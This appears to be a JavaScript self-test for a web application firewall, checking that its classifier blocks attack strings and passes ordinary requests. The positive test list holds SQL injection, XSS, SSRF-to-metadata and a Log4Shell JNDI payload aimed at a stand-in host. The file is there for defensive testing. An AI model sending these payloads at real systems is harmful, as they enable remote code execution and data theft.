// ============================================================================
// self-test.mjs — verifikasi logika WAF Sentinel (port JS).
// Jalankan:  node vercel-waf/self-test.mjs
// Semua assertion harus lolos; exit code 0 = sehat.
// ============================================================================
import { classifyText, inspectRequest, buildDefaultAutomaton, SCORE } from "./src/wafcore.mjs";

let pass = 0, fail = 0;
function ok(name, cond, extra = "") {
  if (cond) { pass++; console.log(`  [OK] ${name}${extra ? "  -> " + extra : ""}`); }
  else      { fail++; console.log(`  [FAIL] ${name}`); }
}

// daftar debi: payload dianggap susah jika classifier bilang iya
const attOk = [
  ["SQLi union select", "q=union select password", 5],
  ["double-encoded quote", "q=%2527%20or%201=1", 5],
  ["Log4Shell jndi", "x=${jndi:ldap://evil}", 5],
  ["XSS script tag", "path=<script>alert(1)</script>", 5],
  ["SSRF metadata", "u=http://169.254.169.254/latest", 5],
];
const passOk = [
  "GET /index.html HTTP/1.1",
  "query=produk diskon promo",
  "POST /api/login user=admin pass=1234",
];

console.log("== Positive (harus diblokir) ==");
for (const [name, payload] of attOk) {
  const r = classifyText(payload.toLowerCase());
  ok("BLOCK " + name, r.suspicious, `score=${r.score}`);
}

console.log("\n== Negative (harus LOLOS) ==");
for (const payload of passOk) {
  const r = classifyText(payload.toLowerCase());
  ok("PASS " + payload.slice(0, 30) + "...", !r.suspicious, `score=${r.score}`);
}

console.log("\n== Threshold / anti-false-positive ==");
// encoding sendirian BELUM cukup (< ambang 5) -> lolos (anti-FP)
const encOnly = classifyText("%41%42%43 biasa");
ok("enc-only LOLOS (anti-FP)", !encOnly.suspicious, `score=${encOnly.score}`);
// struktur (+2) dari decode %xx digabung keyword (+3) = 5 -> BLOCK
const combo = classifyText("x=%27 or 1=1");
ok("combo 2+3=5 diblokir", combo.suspicious, `score=${combo.score}`);
// skor ambang medium-high : "or 1=" (+3) + "and 1=" (+3) = 6 -> BLOCK
const multi = classifyText("x=1 or 1=1 and 1=1");
ok("multi-keyword diblokir", multi.suspicious, `score=${multi.score}`);

console.log("\n== inspectRequest end-to-end ==");
const reqBlk = inspectRequest("POST", "/login?user=%27or%201=1", "Mozilla/5.0", "a=1");
ok("inspectRequest BLOCK", reqBlk.suspicious, `score=${reqBlk.score}`);
const reqOk = inspectRequest("GET", "/home", "Mozilla/5.0", "");
ok("inspectRequest PASS", !reqOk.suspicious, `score=${reqOk.score}`);

console.log("\n== Selesai ==");
console.log(`PASS=${pass} FAIL=${fail}  (threshold default=${SCORE.THRESHOLD})`);
process.exit(fail ? 1 : 0);